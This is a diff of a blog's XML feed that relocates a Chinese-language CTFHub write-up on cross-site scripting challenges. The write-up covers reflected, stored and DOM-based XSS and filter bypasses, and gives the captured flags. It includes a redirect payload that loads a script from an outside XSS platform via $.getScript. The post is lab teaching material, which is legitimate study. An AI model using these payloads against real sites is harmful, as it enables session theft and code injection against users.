@@ -227,27 +227,6 @@
   </entry>
   
   <entry>
-    <title>CTFHub技能树-XSS</title>
-    <link href="https://m3x1.cn/posts/57dd66d8.html"/>
-    <id>https://m3x1.cn/posts/57dd66d8.html</id>
-    <published>2024-11-27T16:00:00.000Z</published>
-    <updated>2025-02-01T16:19:14.230Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="反射型">反射型</h2><p>打开网站</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/9bb879732317d8055c0970fba4a32d29.png" alt="img"></p><p>反射型，直接使用xss平台，将生成的地址传入第一个空</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191232646.png" alt="image-20241128191232646"></p><p>然后将url代码传入第二个空就行</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191309973.png" alt="image-20241128191309973"></p><p>flag=ctfhub{a51bb55f89d068a011466d62}</p><h2 id="存储型">存储型</h2><p>打开网站，依然像上面的步骤一样。</p><p>区别于前面反射型xss的是，他建立恶意连接是在于每一次都要发送含恶意代码，而这个存储xss不需要，一旦发送过一次，以后每次访问它时，都会含有恶意代码</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128215208090.png" alt="image-20241128215208090"></p><blockquote><p>flag=ctfhub{1cef0cbbc0bb33244d4a5c76}</p></blockquote><h2 id="DOM反射">DOM反射</h2><p>查看源码位置</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128215659407.png" alt="image-20241128215659407"></p><p>需要闭合前面的 ’  ，所以只需要在xss注入时前面加上’; ，然后把后面的’;注释掉。</p><p>由于前面没有东西了，所以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/script&gt;&lt;script src= &gt;</span><br></pre></td></tr></table></figure><p>其余步骤一样</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128220249060.png" alt="image-20241128220249060"></p><blockquote><p>flag=ctfhub{aebf8f6244f0ad340612cc6e}</p></blockquote><h2 id="过滤空格">过滤空格</h2><p>步骤一样，空格可以用[/]或者/**/代替</p><blockquote><p>flag=ctfhub{9830f9e82cfbc1e77a1d0dae}</p></blockquote><h2 id="过滤关键词">过滤关键词</h2><p>先用探针试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128230131380.png" alt="image-20241128230131380"></p><p>发现没有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script</span><br></pre></td></tr></table></figure><p>所以是过滤了关键字script，可以使用大小写绕过，用sCRiPt</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128230522782.png" alt="image-20241128230522782"></p><blockquote><p>flag=ctfhub{9f0740745ba9e7b754658614}</p></blockquote><h2 id="DOM跳转">DOM跳转</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/8cc2801a3c464c193d00baffc33e1cf5.png" alt="img"></p><p>分析一下，代码意思是 从当前页面的URL中获取查询字符串（URL的get参数），如果参数名为&quot;jumpto&quot;，则将页面重定向到参数值所指定的URL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">        var target = location.search.split(&quot;=&quot;)</span><br><span class="line">  //以等号分割成两份，一份是参数名，另一份是参数的值（可利用）</span><br><span class="line">        if (target[0].slice(1) == &quot;jumpto&quot;) &#123;</span><br><span class="line">  //其中target[0].slice(1)是指去掉?后面的参数名</span><br><span class="line">            location.href = target[1];</span><br><span class="line">  //如果参数名相等，就location.href（表示页面跳转）到target[1]，也就是参数的值</span><br><span class="line">        &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>可以利用js代码和 jQuery 的 $.getScript() 函数来异步加载并执行来自 xss平台 的 js 脚本，使用前提是网站引用了jQuery。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0a827819b269477f8353e9ab693fd778.png" alt="img"></p><p>这里构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-c644076cd9fc7c0b.sandbox.ctfhub.com:10800/?jumpto=javascript:$.getScript(&quot;//xsscom.com//He7bc3&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5d1f1a7369a1089bdaf85bfe5d4c2e11.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/81d580917fb146dbd354c87ab6ee6e49.png" alt="img"></p>]]></content>
-    
-    
-    <summary type="html">CTFHub技能树-XSS系列wp</summary>
-    
-    
-    
-    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
-    
-    
-    <category term="web-wp" scheme="https://m3x1.cn/tags/web-wp/"/>
-    
-  </entry>
-  
-  <entry>
     <title>XSS在线平台使用</title>
     <link href="https://m3x1.cn/posts/169f5f8e.html"/>
     <id>https://m3x1.cn/posts/169f5f8e.html</id>
@@ -265,6 +244,27 @@
     
     
     <category term="其他姿势" scheme="https://m3x1.cn/tags/%E5%85%B6%E4%BB%96%E5%A7%BF%E5%8A%BF/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>CTFHub技能树-XSS</title>
+    <link href="https://m3x1.cn/posts/57dd66d8.html"/>
+    <id>https://m3x1.cn/posts/57dd66d8.html</id>
+    <published>2024-11-27T16:00:00.000Z</published>
+    <updated>2025-02-01T16:19:14.230Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="反射型">反射型</h2><p>打开网站</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/9bb879732317d8055c0970fba4a32d29.png" alt="img"></p><p>反射型，直接使用xss平台，将生成的地址传入第一个空</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191232646.png" alt="image-20241128191232646"></p><p>然后将url代码传入第二个空就行</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191309973.png" alt="image-20241128191309973"></p><p>flag=ctfhub{a51bb55f89d068a011466d62}</p><h2 id="存储型">存储型</h2><p>打开网站，依然像上面的步骤一样。</p><p>区别于前面反射型xss的是，他建立恶意连接是在于每一次都要发送含恶意代码，而这个存储xss不需要，一旦发送过一次，以后每次访问它时，都会含有恶意代码</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128215208090.png" alt="image-20241128215208090"></p><blockquote><p>flag=ctfhub{1cef0cbbc0bb33244d4a5c76}</p></blockquote><h2 id="DOM反射">DOM反射</h2><p>查看源码位置</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128215659407.png" alt="image-20241128215659407"></p><p>需要闭合前面的 ’  ，所以只需要在xss注入时前面加上’; ，然后把后面的’;注释掉。</p><p>由于前面没有东西了，所以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/script&gt;&lt;script src= &gt;</span><br></pre></td></tr></table></figure><p>其余步骤一样</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128220249060.png" alt="image-20241128220249060"></p><blockquote><p>flag=ctfhub{aebf8f6244f0ad340612cc6e}</p></blockquote><h2 id="过滤空格">过滤空格</h2><p>步骤一样，空格可以用[/]或者/**/代替</p><blockquote><p>flag=ctfhub{9830f9e82cfbc1e77a1d0dae}</p></blockquote><h2 id="过滤关键词">过滤关键词</h2><p>先用探针试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128230131380.png" alt="image-20241128230131380"></p><p>发现没有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script</span><br></pre></td></tr></table></figure><p>所以是过滤了关键字script，可以使用大小写绕过，用sCRiPt</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128230522782.png" alt="image-20241128230522782"></p><blockquote><p>flag=ctfhub{9f0740745ba9e7b754658614}</p></blockquote><h2 id="DOM跳转">DOM跳转</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/8cc2801a3c464c193d00baffc33e1cf5.png" alt="img"></p><p>分析一下，代码意思是 从当前页面的URL中获取查询字符串（URL的get参数），如果参数名为&quot;jumpto&quot;，则将页面重定向到参数值所指定的URL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">        var target = location.search.split(&quot;=&quot;)</span><br><span class="line">  //以等号分割成两份，一份是参数名，另一份是参数的值（可利用）</span><br><span class="line">        if (target[0].slice(1) == &quot;jumpto&quot;) &#123;</span><br><span class="line">  //其中target[0].slice(1)是指去掉?后面的参数名</span><br><span class="line">            location.href = target[1];</span><br><span class="line">  //如果参数名相等，就location.href（表示页面跳转）到target[1]，也就是参数的值</span><br><span class="line">        &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>可以利用js代码和 jQuery 的 $.getScript() 函数来异步加载并执行来自 xss平台 的 js 脚本，使用前提是网站引用了jQuery。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0a827819b269477f8353e9ab693fd778.png" alt="img"></p><p>这里构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-c644076cd9fc7c0b.sandbox.ctfhub.com:10800/?jumpto=javascript:$.getScript(&quot;//xsscom.com//He7bc3&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5d1f1a7369a1089bdaf85bfe5d4c2e11.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/81d580917fb146dbd354c87ab6ee6e49.png" alt="img"></p>]]></content>
+    
+    
+    <summary type="html">CTFHub技能树-XSS系列wp</summary>
+    
+    
+    
+    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
+    
+    
+    <category term="web-wp" scheme="https://m3x1.cn/tags/web-wp/"/>
     
   </entry>
   
